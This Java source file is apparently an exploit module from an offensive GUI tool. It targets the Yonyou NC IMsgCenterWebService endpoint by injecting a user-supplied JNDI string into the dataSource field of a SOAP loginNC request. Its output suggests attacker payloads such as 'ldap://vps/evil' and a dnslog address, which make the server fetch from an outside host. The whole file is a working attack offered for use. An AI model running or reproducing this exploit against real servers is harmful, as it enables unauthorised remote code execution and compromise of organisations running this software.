package exp.oa.yongyou.nc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class yongyou_nc_IMsgCenterWebServer_JNDI implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try{
            String data = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ims=\"http://msgcenter.itf.nc/IMsgCenterWebService\">\n" +
                    "   <soapenv:Header/>\n" +
                    "   <soapenv:Body>\n" +
                    "      <ims:loginNC>\n" +
                    "         <!--type: string-->\n" +
                    "         <dataSource>1</dataSource>\n" +
                    "         <!--type: string-->\n" +
                    "         <usercode>sonoras imperio</usercode>\n" +
                    "         <!--type: string-->\n" +
                    "         <password>quae divum incedo</password>\n" +
                    "      </ims:loginNC>\n" +
                    "   </soapenv:Body>\n" +
                    "</soapenv:Envelope>";
            HashMap head = new HashMap<String, String>();
            head.put("SOAPAction","urn:loginNC");
            Response response = HttpTools.post(url + "/uapws/service/nc.itf.msgcenter.IMsgCenterWebService",data, head, "utf-8");
            if (response.getCode() != 404  && response.getCode()!=0) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_nc_IMsgCenterWebServer_JNDI ]");
                    textArea.appendText("\n 存在IMsgCenterWebService接口");
                });
                Platform.runLater(() -> {
                    textArea.appendText("\n eg1: ldap://dnslog.cn");
                    textArea.appendText("\n eg2: ldap://vps/evil\n");
                });
                return true;
            } else {
                Platform.runLater(() -> textArea.appendText("\n"));

                return false;
            }
        }catch (Exception e){
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        try{
            String data = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ims=\"http://msgcenter.itf.nc/IMsgCenterWebService\">\n" +
                    "   <soapenv:Header/>\n" +
                    "   <soapenv:Body>\n" +
                    "      <ims:loginNC>\n" +
                    "         <!--type: string-->\n" +
                    "         <dataSource>"+cmd+"</dataSource>\n" +
                    "         <!--type: string-->\n" +
                    "         <usercode>sonoras imperio</usercode>\n" +
                    "         <!--type: string-->\n" +
                    "         <password>quae divum incedo</password>\n" +
                    "      </ims:loginNC>\n" +
                    "   </soapenv:Body>\n" +
                    "</soapenv:Envelope>";
            HashMap head = new HashMap<String, String>();
            head.put("SOAPAction","urn:loginNC");
            Response response = HttpTools.post(url + "/uapws/service/nc.itf.msgcenter.IMsgCenterWebService",data, head, "utf-8");
            if (response.getCode() != 404 && response.getCode()!=0) {
                    Platform.runLater(() -> {
                        textArea.appendText("\n 执行成功,请自行判断");
                        textArea_cmd.appendText("\n"+ cmd);
                    });
                    return true;
                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n 执行失败！");
                    });
                    return false;
                }
        }catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });

        }
        return false;
    }
}
